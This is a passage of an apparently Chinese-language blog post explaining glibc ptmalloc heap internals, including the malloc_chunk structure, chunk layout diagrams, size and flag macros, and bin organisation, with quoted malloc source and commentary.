 unsigned type, even if size_t is a signed type. This may avoid some</span></span><br><span class="line"><span class="comment">   artificial size limitations on some systems.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   On a 64-bit machine, you may be able to reduce malloc overhead by</span></span><br><span class="line"><span class="comment">   defining INTERNAL_SIZE_T to be a 32 bit `unsigned int&#x27; at the</span></span><br><span class="line"><span class="comment">   expense of not being able to handle more than 2^32 of malloced</span></span><br><span class="line"><span class="comment">   space. If this limitation is acceptable, you are encouraged to set</span></span><br><span class="line"><span class="comment">   this unless you are on a platform requiring 16byte alignments. In</span></span><br><span class="line"><span class="comment">   this case the alignment requirements turn out to negate any</span></span><br><span class="line"><span class="comment">   potential advantages of decreasing size_t word size.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Implementors: Beware of the possible combinations of:</span></span><br><span class="line"><span class="comment">     - INTERNAL_SIZE_T might be signed or unsigned, might be 32 or 64 bits,</span></span><br><span class="line"><span class="comment">       and might be the same width as int or as long</span></span><br><span class="line"><span class="comment">     - size_t might have different width and signedness as INTERNAL_SIZE_T</span></span><br><span class="line"><span class="comment">     - int and long might be 32 or 64 bits, and might be the same width</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   To deal with this, most comparisons and difference computations</span></span><br><span class="line"><span class="comment">   among INTERNAL_SIZE_Ts should cast them to unsigned long, being</span></span><br><span class="line"><span class="comment">   aware of the fact that casting an unsigned int to a wider long does</span></span><br><span class="line"><span class="comment">   not sign-extend. (This also makes checking for negative numbers</span></span><br><span class="line"><span class="comment">   awkward.) Some of these casts result in harmless compiler warnings</span></span><br><span class="line"><span class="comment">   on some systems.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> INTERNAL_SIZE_T</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> INTERNAL_SIZE_T size_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding word size.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_SZ (sizeof (INTERNAL_SIZE_T))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding bit mask value.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Forward declarations.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 使用状态下:</span></span><br><span class="line"><span class="comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-</span></span><br><span class="line"><span class="comment">	    |             Size of previous chunk, if unallocated (P clear)  |</span></span><br><span class="line"><span class="comment">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">	    |             Size of chunk, in bytes                     |A|M|P|</span></span><br><span class="line"><span class="comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-</span></span><br><span class="line"><span class="comment">	    |             User data starts here...                          .</span></span><br><span class="line"><span class="comment">	    .                                                               .</span></span><br><span class="line"><span class="comment">	    .             (malloc_usable_size() bytes)                      .</span></span><br><span class="line"><span class="comment">	    .                                                               |</span></span><br><span class="line"><span class="comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-</span></span><br><span class="line"><span class="comment">	    |             (size of chunk, but used for application data)    |</span></span><br><span class="line"><span class="comment">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">	    |             Size of next chunk, in bytes                |A|0|1|</span></span><br><span class="line"><span class="comment">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* free状态下:</span></span><br><span class="line"><span class="comment">   chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-</span></span><br><span class="line"><span class="comment">	    |             Size of previous chunk, if unallocated (P clear)  |</span></span><br><span class="line"><span class="comment">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment"> head:  |             Size of chunk, in bytes                     |A|0|P|</span></span><br><span class="line"><span class="comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-</span></span><br><span class="line"><span class="comment">	    |             Forward pointer to next chunk in list             |</span></span><br><span class="line"><span class="comment">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">	    |             Back pointer to previous chunk in list            |</span></span><br><span class="line"><span class="comment">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">	    |             Unused space (may be 0 bytes long)                .</span></span><br><span class="line"><span class="comment">	    .                                                               .</span></span><br><span class="line"><span class="comment">	    .                                                               |</span></span><br><span class="line"><span class="comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-</span></span><br><span class="line"><span class="comment"> foot:  |             Size of chunk, in bytes                           |</span></span><br><span class="line"><span class="comment">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">	    |             Size of next chunk, in bytes                |A|0|0|</span></span><br><span class="line"><span class="comment">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>malloc_chunk结构体是chunk在free状态下的视图</p>
</blockquote>
<ul>
<li>**prev_size **如果chunk的物理相邻的前一地址chunk的是空闲的,该字段记录的是前一个chunk(较低地址的chunk)的大小,否则该字段用来存放前一个chunk的数据(空间复用),</li>
<li><strong>size</strong>: 该chunk的大小,必须是2*SIZE_SZ的整数倍(会使用MALLOC_ALIGN_MASK对齐),由于存在对齐(地址是8的整数倍),低三个字节对chunk的大小没有影响,被用来当作标志位,从高到低为:<ul>
<li><strong>NON_MAIN_ARENA</strong>, 记录当前chunk是否不属于主线程,1表示不属于,0表示属于</li>
<li><strong>IS_MAPPED</strong> 记录当前chunk是否有mmap分配的</li>
<li><strong>PREV_SIZE</strong> 记录前一个chunk是否被分配,(堆中第一个被分配的内存块的size字段的P位一定会被设置位1,以防止访问前面的非法内存),当一个chunk的size的P位为0是,能够通过prev_size字段,来获取上一个chunk的大小以及地址</li>
</ul>
</li>
<li><strong>fd,bk</strong> chunk处于分配状态的时候,从fd开始时用户的数据,chunk空闲的时候,会被添加到对应的空闲管理链表中<ul>
<li><strong>fd</strong>指向下一个(非物理相邻的)空闲chunk</li>
<li><strong>bk</strong>指向上一个(非物理相邻的)空闲的chunk</li>
<li>通过fd和bk可以将空闲的chunk加入到空闲chunk块链表中统一管理</li>
</ul>
</li>
<li><strong>fd_nextsize, bk_nextsize</strong> chunk空暇的时候,用于largebin,<ul>
<li><strong>fd_nextsize</strong> 指向largebin中前一个与当前chunk大小不同的第一个空闲块,不包含bin的头指针</li>
<li><strong>bk_nextsize</strong> 指向largebin中后一个与当前chunk大小不同的第一个空闲块,不包含bin的头指针</li>
<li>一般空闲的large chunk在fd的遍历顺序中, 按照由大到小的顺序排列(避免在寻找合适的chunk时挨个遍历)</li>
</ul>
</li>
</ul>
<h4 id="chunk相关宏"><a href="#chunk相关宏" class="headerlink" title="chunk相关宏"></a>chunk相关宏</h4><p>主要是chunk大小,对齐检查以及转换的宏</p>
<h5 id="chunk与mem指针头部的转换"><a href="#chunk与mem指针头部的转换" class="headerlink" title="chunk与mem指针头部的转换"></a>chunk与mem指针头部的转换</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* conversion from malloc headers to user pointers, and back */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span></span><br></pre></td></tr></table></figure>

<ul>
<li>mem指向用户得到的内存的起始位置(fd开始)</li>
</ul>
<h5 id="最小chunk大小"><a href="#最小chunk大小" class="headerlink" title="最小chunk大小"></a>最小chunk大小</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br></pre></td></tr></table></figure>

<ul>
<li>offsetof函数计算出fd_nextsize在malloc_chunk中的偏移</li>
<li>最小的chunk至少要包含到bk指针</li>
</ul>
<h5 id="最小申请的堆内存大小"><a href="#最小申请的堆内存大小" class="headerlink" title="最小申请的堆内存大小"></a>最小申请的堆内存大小</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE                                                         \</span></span><br><span class="line"><span class="meta">    (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp;            \</span></span><br><span class="line"><span class="meta">                      ~MALLOC_ALIGN_MASK))</span></span><br></pre></td></tr></table></figure>

<ul>
<li>用户申请的最小内存大小是2*SIZE_SZ的最小整数倍</li>
</ul>
<h5 id="请求字节数判断"><a href="#请求字节数判断" class="headerlink" title="请求字节数判断"></a>请求字节数判断</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                       \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br></pre></td></tr></table></figure>

<h5 id="将用户请求内存大小转换为实际分配内存大小"><a href="#将用户请求内存大小转换为实际分配内存大小" class="headerlink" title="将用户请求内存大小转换为实际分配内存大小"></a>将用户请求内存大小转换为实际分配内存大小</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                               \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                    \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                      \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz)                                   \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                    \</span></span><br><span class="line"><span class="meta">        __set_errno(ENOMEM);                                            \</span></span><br><span class="line"><span class="meta">        return 0;                                                       \</span></span><br><span class="line"><span class="meta">    &#125;                                                                   \</span></span><br><span class="line"><span class="meta">    (sz) = request2size(req);</span></span><br></pre></td></tr></table></figure>

<p>当chunk处于已经分配的状态时,它的物理相邻的下一个chunk的prev_size字段是无效的用于上一个chunk空间复用</p>
<ol>
<li>利用REQUEST_OUT_OF_RANGE 判断是否可以分配用户请求字节大小的chunk</li>
<li>chunk间复用,所以可以使用下一个chunk的prev_size字段,因此是一个SIZE_SZ大小(+2*SIZE_SZ-SIZE_SZ)</li>
<li>对于不满足最低MINISIZE要求的chunk大小直接分配MINISIZE字节</li>
<li>如果大于的话,需要使用MALLOC_ALIGN_MASK对齐</li>
</ol>
<h5 id="标记位相关"><a href="#标记位相关" class="headerlink" title="标记位相关"></a>标记位相关</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract inuse bit of previous chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check for mmap()&#x27;ed chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span></span><br><span class="line"><span class="comment">   from a non-main arena.  This is only set immediately before handing</span></span><br><span class="line"><span class="comment">   the chunk to the user, if necessary.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for chunk from main arena.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark a chunk as not being on the main arena.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure>

<h5 id="获取chunksize"><a href="#获取chunksize" class="headerlink" title="获取chunksize"></a>获取chunksize</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure>

<h5 id="获取下一个物理相邻的chunk"><a href="#获取下一个物理相邻的chunk" class="headerlink" title="获取下一个物理相邻的chunk"></a>获取下一个物理相邻的chunk</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span></span><br></pre></td></tr></table></figure>

<h5 id="获取前一个chunk的信息"><a href="#获取前一个chunk的信息" class="headerlink" title="获取前一个chunk的信息"></a>获取前一个chunk的信息</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set the size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))</span></span><br></pre></td></tr></table></figure>

<h5 id="获取指定偏移的chunk"><a href="#获取指定偏移的chunk" class="headerlink" title="获取指定偏移的chunk"></a>获取指定偏移的chunk</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure>

<h5 id="指定偏移处chunk使用状态相关操作"><a href="#指定偏移处chunk使用状态相关操作" class="headerlink" title="指定偏移处chunk使用状态相关操作"></a>指定偏移处chunk使用状态相关操作</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</span></span><br></pre></td></tr></table></figure>

<h5 id="当前chunk使用状态相关操作"><a href="#当前chunk使用状态相关操作" class="headerlink" title="当前chunk使用状态相关操作"></a>当前chunk使用状态相关操作</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* extract p&#x27;s inuse bit */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)							      \</span></span><br><span class="line"><span class="meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* set/clear chunk as being inuse without otherwise disturbing */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse(p)							      \</span></span><br><span class="line"><span class="meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size |= PREV_INUSE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_inuse(p)							      \</span></span><br><span class="line"><span class="meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span></span><br></pre></td></tr></table></figure>

<h5 id="设置chunk的size字段"><a href="#设置chunk的size字段" class="headerlink" title="设置chunk的size字段"></a>设置chunk的size字段</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Set size at head, without disturbing its use bit */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_head_size(p, s)  ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span></span><br></pre></td></tr></table></figure>

<h4 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h4><p>ptmalloc使用分箱式方法堆空闲的chunk进行管理, 根据chunk的大小以及使用状态分为四类:fastbins, smallbins, largebins, unsortedbins,相似大小的chunk使用双向链表链接起来</p>
<p>使用<code>malloc_state</code>结构体存储所有bin的数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS             128  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br></pre></td></tr></table></figure>

<ul>
<li><p>每一个bin都是mchunkptr类型,即每个bin都可以看作一个最小的chunk</p>
</li>
<li><p>由于每个bin只会用到fd和bk,即bin的prev_size和size是没有用的,为了节省空间会将两个bin重叠(上面去掉的2,逻辑上是第一个bin的prev_size和size)</p>
<p>![image-20220508223324262](C:\youyue’s blog\source_posts\刷题记录-0x3\image-20220508223324262.png)</p>
</li>
<li><p>数组中的bin依次为</p>
<ul>
<li>第一个为:unsortedbin 链表, 存放没排序的chunk</li>
<li>索引从2到63的bin为smallbin, 同一个smallbin 链表中的chunk大小相同,两个相邻索引的smallbin链表中的chunk大小相差字节数为2*size_t</li>
<li>smallbin后面的bin为largebins, 其中每一个bin都包含一定范围内的chunk里面的chunk按照fd指针顺序从大到小排列,相同大小的chunk按照最近使用顺序排列</li>
</ul>
<p>任意两个物理相邻的空闲chunk不能在一起</p>
</li>
<li><p>一些小的chunk会被放到fastbin中</p>
</li>
</ul>
<h5 id="bin的通用宏"><a href="#bin的通用宏" class="headerlink" title="bin的通用宏"></a>bin的通用宏</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))			      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* analog of ++bin */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Reminders about list directionality within bins */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure>

<ul>
